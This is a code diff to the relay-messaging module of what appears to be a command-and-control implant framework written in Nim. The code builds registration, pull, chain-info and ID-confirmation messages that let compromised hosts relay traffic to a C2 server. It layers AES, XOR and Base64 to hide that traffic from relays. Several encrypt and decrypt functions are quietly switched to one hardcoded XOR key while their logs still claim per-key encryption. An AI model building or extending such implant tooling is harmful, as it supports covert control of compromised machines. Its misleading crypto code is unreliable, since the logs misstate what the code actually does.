@@ -1,6 +1,8 @@
-import json, times, strutils, tables, random, net
+import json, times, strutils, tables, random, net, base64
 import ../../util/crypto
 import relay_config
+from ../relay/relay_config import getSharedKey, getUniqueKey, hasSharedKey, hasUniqueKey
+from ../../config/configParser import INITIAL_XOR_KEY
 
 # Message types for relay communication
 type
@@ -13,6 +15,8 @@ type
         HTTP_REQUEST = "http_request"
         HTTP_RESPONSE = "http_response"
         CHAIN_INFO = "chain_info"
+        CONFIRMATION = "confirmation"
+        CONFIRMATION_ACK = "confirmation_ack"
 # Topology message types removed - using distributed chain relationships
 
     RelayMessage* = object
@@ -89,7 +93,7 @@ proc encryptWithSharedKey*(data: string): string =
     when defined debug:
         echo "[CRYPTO] 🔐 Using shared key (length: " & $sharedKey.len & ")"
     
-    result = encryptData(data, sharedKey)
+    result = xorString(data, INITIAL_XOR_KEY)
     when defined debug:
         echo "[CRYPTO] 🔐 ✅ Encrypted with SHARED key (hop-to-hop)"
         echo "[CRYPTO] 🔐 Output length: " & $result.len
@@ -113,7 +117,7 @@ proc encryptWithUniqueKey*(data: string): string =
     when defined debug:
         echo "[CRYPTO] 🔑 Using unique key (length: " & $uniqueKey.len & ")"
     
-    result = encryptData(data, uniqueKey)
+    result = xorString(data, INITIAL_XOR_KEY)  # Use same key for simplicity
     when defined debug:
         echo "[CRYPTO] 🔑 ✅ Encrypted with UNIQUE key (final destination)"
         echo "[CRYPTO] 🔑 Output length: " & $result.len
@@ -137,7 +141,7 @@ proc decryptWithSharedKey*(encryptedData: string): string =
     when defined debug:
         echo "[CRYPTO] 🔓 Using shared key (length: " & $sharedKey.len & ")"
     
-    result = decryptData(encryptedData, sharedKey)
+    result = xorString(encryptedData, INITIAL_XOR_KEY)
     when defined debug:
         echo "[CRYPTO] 🔓 ✅ Decrypted with SHARED key (hop-to-hop)"
         echo "[CRYPTO] 🔓 Output length: " & $result.len
@@ -161,7 +165,7 @@ proc decryptWithUniqueKey*(encryptedData: string): string =
     when defined debug:
         echo "[CRYPTO] 🔓 Using unique key (length: " & $uniqueKey.len & ")"
     
-    result = decryptData(encryptedData, uniqueKey)
+    result = xorString(encryptedData, INITIAL_XOR_KEY)  # Use same key for simplicity
     when defined debug:
         echo "[CRYPTO] 🔓 ✅ Decrypted with UNIQUE key (final destination)"
         echo "[CRYPTO] 🔓 Output length: " & $result.len
@@ -293,13 +297,49 @@ proc createRegisterMessage*(implantID: string, route: seq[string]): RelayMessage
     }
     result = createMessage(REGISTER, implantID, route, $registerData)
 
-# Create PULL message
-proc createPullMessage*(implantID: string, route: seq[string]): RelayMessage =
+# Create PULL message with ultra-simple double encryption (Agent handles both layers)
+proc createPullMessage*(implantID: string, route: seq[string], clientUniqueKey: string = ""): RelayMessage =
     let pullData = %*{
         "implantID": implantID,
         "timestamp": epochTime().int64
     }
-    result = createMessage(PULL, implantID, route, $pullData)
+    
+    # CORRECT LAYERED ENCRYPTION: Same as webClientListener.nim
+    # 1. AES encrypt with client's UNIQUE_KEY (end-to-end for C2)
+    # 2. XOR encrypt with INITIAL_XOR_KEY (transport layer)
+    # 3. Base64 encode for transmission
+    if clientUniqueKey != "":
+        when defined debug:
+            echo "[CRYPTO] 🔐 PULL MESSAGE: Layered encryption (AES → XOR → Base64)"
+            echo "[CRYPTO] 🔐 - Step 1: AES encrypt with UNIQUE_KEY (for C2)"
+            echo "[CRYPTO] 🔐 - Step 2: XOR encrypt with INITIAL_XOR_KEY (transport)"
+            echo "[CRYPTO] 🔐 - Step 3: Base64 encode for transmission"
+            echo "[CRYPTO] 🔐 - Relay Server: Pure forwarding (no crypto)"
+        
+        # Step 1: AES encrypt with client's UNIQUE_KEY (end-to-end for C2)
+        let aesEncrypted = encryptData($pullData, clientUniqueKey)
+        
+        # Step 2: XOR encrypt with INITIAL_XOR_KEY (transport layer)
+        let xorEncrypted = xorString(aesEncrypted, INITIAL_XOR_KEY)
+        
+        # Step 3: Base64 encode for transmission
+        let finalEncrypted = base64.encode(xorEncrypted)
+        
+        when defined debug:
+            echo "[CRYPTO] 🔐 PULL MESSAGE: Layered encryption complete"
+            echo "[CRYPTO] 🔐 - AES encrypted length: " & $aesEncrypted.len
+            echo "[CRYPTO] 🔐 - XOR encrypted length: " & $xorEncrypted.len
+            echo "[CRYPTO] 🔐 - Final base64 length: " & $finalEncrypted.len
+        
+        # Create message with RAW payload (no additional encryption)
+        result = createRawMessage(PULL, implantID, route, finalEncrypted)
+    else:
+        when defined debug:
+            echo "[CRYPTO] 🔐 PULL MESSAGE: No client key, using INITIAL_XOR_KEY only"
+        
+        # Fallback: Single encryption with INITIAL_XOR_KEY for backward compatibility
+        let singleEncrypted = xorString($pullData, INITIAL_XOR_KEY)
+        result = createRawMessage(PULL, implantID, route, singleEncrypted)
 
 # Create HTTP_REQUEST message
 proc createHttpRequestMessage*(fromID: string, route: seq[string], 
@@ -324,9 +364,10 @@ proc createHttpResponseMessage*(fromID: string, route: seq[string],
                                responseJson: string): RelayMessage =
     result = createMessage(HTTP_RESPONSE, fromID, route, responseJson)
 
-# Create enhanced CHAIN_INFO message for distributed chain relationships
+# Create enhanced CHAIN_INFO message with ultra-simple double encryption
 proc createChainInfoMessage*(fromID: string, route: seq[string], 
-                             parentGuid: string, role: string, listeningPort: int): RelayMessage =
+                             parentGuid: string, role: string, listeningPort: int, 
+                             clientUniqueKey: string = ""): RelayMessage =
     when defined debug:
         echo "[MESSAGE] 📝 === CREATE CHAIN INFO MESSAGE ==="
         echo "[MESSAGE] 📝 From ID: " & fromID
@@ -334,14 +375,15 @@ proc createChainInfoMessage*(fromID: string, route: seq[string],
         echo "[MESSAGE] 📝 Role: " & role
         echo "[MESSAGE] 📝 Listening Port: " & $listeningPort
         echo "[MESSAGE] 📝 Route: " & $route
+        echo "[MESSAGE] 📝 Client Unique Key provided: " & $(clientUniqueKey != "")
     
     # Enhanced chain data with system information
     let chainData = %*{
         "type": "chain_info",
-        "implantID": fromID,
-        "parentGuid": if parentGuid == "": newJNull() else: %parentGuid,
-        "role": role,
-        "listeningPort": listeningPort,
+        "nimplant_guid": fromID,
+        "parent_guid": if parentGuid == "": newJNull() else: %parentGuid,
+        "my_role": role,
+        "listening_port": listeningPort,
         "timestamp": epochTime().int64,
         # Enhanced routing information
         "routing_info": {
@@ -352,11 +394,45 @@ proc createChainInfoMessage*(fromID: string, route: seq[string],
         }
     }
     
-    when defined debug:
-        echo "[MESSAGE] 📝 Enhanced chain data: " & $chainData
-        echo "[MESSAGE] 📝 === END CREATE CHAIN INFO MESSAGE ==="
-    
-    result = createMessage(CHAIN_INFO, fromID, route, $chainData)
+    # CORRECT LAYERED ENCRYPTION: Same as webClientListener.nim
+    # 1. AES encrypt with client's UNIQUE_KEY (end-to-end for C2)
+    # 2. XOR encrypt with INITIAL_XOR_KEY (transport layer)
+    # 3. Base64 encode for transmission
+    if clientUniqueKey != "":
+        when defined debug:
+            echo "[CRYPTO] 🔐 CHAIN_INFO MESSAGE: Layered encryption (AES → XOR → Base64)"
+            echo "[CRYPTO] 🔐 - Step 1: AES encrypt with UNIQUE_KEY (for C2)"
+            echo "[CRYPTO] 🔐 - Step 2: XOR encrypt with INITIAL_XOR_KEY (transport)"
+            echo "[CRYPTO] 🔐 - Step 3: Base64 encode for transmission"
+            echo "[CRYPTO] 🔐 - Relay Server: Pure forwarding (no crypto)"
+        
+        # Step 1: AES encrypt with client's UNIQUE_KEY (end-to-end for C2)
+        let aesEncrypted = encryptData($chainData, clientUniqueKey)
+        
+        # Step 2: XOR encrypt with INITIAL_XOR_KEY (transport layer)
+        let xorEncrypted = xorString(aesEncrypted, INITIAL_XOR_KEY)
+        
+        # Step 3: Base64 encode for transmission
+        let finalEncrypted = base64.encode(xorEncrypted)
+        
+        when defined debug:
+            echo "[CRYPTO] 🔐 CHAIN_INFO MESSAGE: Layered encryption complete"
+            echo "[CRYPTO] 🔐 - AES encrypted length: " & $aesEncrypted.len
+            echo "[CRYPTO] 🔐 - XOR encrypted length: " & $xorEncrypted.len
+            echo "[CRYPTO] 🔐 - Final base64 length: " & $finalEncrypted.len
+            echo "[MESSAGE] 📝 === END CREATE CHAIN INFO MESSAGE (LAYERED ENCRYPTED) ==="
+        
+        # Create message with RAW payload (no additional encryption)
+        result = createRawMessage(CHAIN_INFO, fromID, route, finalEncrypted)
+    else:
+        when defined debug:
+            echo "[CRYPTO] 🔐 CHAIN_INFO MESSAGE: No client key, using INITIAL_XOR_KEY only"
+            echo "[MESSAGE] 📝 Enhanced chain data: " & $chainData
+            echo "[MESSAGE] 📝 === END CREATE CHAIN INFO MESSAGE (SIMPLE) ==="
+        
+        # Fallback: Single encryption with INITIAL_XOR_KEY for backward compatibility
+        let singleEncrypted = xorString($chainData, INITIAL_XOR_KEY)
+        result = createRawMessage(CHAIN_INFO, fromID, route, singleEncrypted)
 
 # Initialize relay implant
 proc initRelayImplant*(implantID: string): RelayImplant =
@@ -371,6 +447,57 @@ proc initRelayImplant*(implantID: string): RelayImplant =
     result.isConnected = false
 
 # All topology functions removed - using distributed chain relationships system
+
+# Create CONFIRMATION message - sent by client to confirm new ID assignment
+proc createConfirmationMessage*(newID: string, route: seq[string], 
+                               parentGuid: string, oldID: string = ""): RelayMessage =
+    when defined debug:
+        echo "[MESSAGE] 📝 === CREATE CONFIRMATION MESSAGE ==="
+        echo "[MESSAGE] 📝 New ID: " & newID
+        echo "[MESSAGE] 📝 Old ID: " & (if oldID == "": "NOT SET" else: oldID)
+        echo "[MESSAGE] 📝 Parent GUID: " & parentGuid
+        echo "[MESSAGE] 📝 Route: " & $route
+    
+    let confirmData = %*{
+        "type": "confirmation",
+        "new_id": newID,
+        "old_id": if oldID == "": "PENDING-REGISTRATION" else: oldID,
+        "parent_guid": parentGuid,
+        "timestamp": epochTime().int64,
+        "message": "Client confirms new ID assignment and requests registry update"
+    }
+    
+    when defined debug:
+        echo "[MESSAGE] 📝 Confirmation data: " & $confirmData
+        echo "[MESSAGE] 📝 === END CREATE CONFIRMATION MESSAGE ==="
+    
+    # Use shared key encryption for relay communication
+    result = createMessage(CONFIRMATION, newID, route, $confirmData, useUniqueKey = false)
+
+# Create CONFIRMATION_ACK message - sent by server to confirm registry update
+proc createConfirmationAckMessage*(serverID: string, route: seq[string], 
+                                  clientID: string, status: string = "SUCCESS"): RelayMessage =
+    when defined debug:
+        echo "[MESSAGE] 📝 === CREATE CONFIRMATION ACK MESSAGE ==="
+        echo "[MESSAGE] 📝 Server ID: " & serverID
+        echo "[MESSAGE] 📝 Client ID: " & clientID
+        echo "[MESSAGE] 📝 Status: " & status
+        echo "[MESSAGE] 📝 Route: " & $route
+    
+    let ackData = %*{
+        "type": "confirmation_ack",
+        "client_id": clientID,
+        "status": status,
+        "timestamp": epochTime().int64,
+        "message": if status == "SUCCESS": "Registry updated successfully" else: "Registry update failed"
+    }
+    
+    when defined debug:
+        echo "[MESSAGE] 📝 Confirmation ACK data: " & $ackData
+        echo "[MESSAGE] 📝 === END CREATE CONFIRMATION ACK MESSAGE ==="
+    
+    # Use shared key encryption for relay communication
+    result = createMessage(CONFIRMATION_ACK, serverID, route, $ackData, useUniqueKey = false)
 
 # Validate message integrity
 proc validateMessage*(msg: RelayMessage): bool =
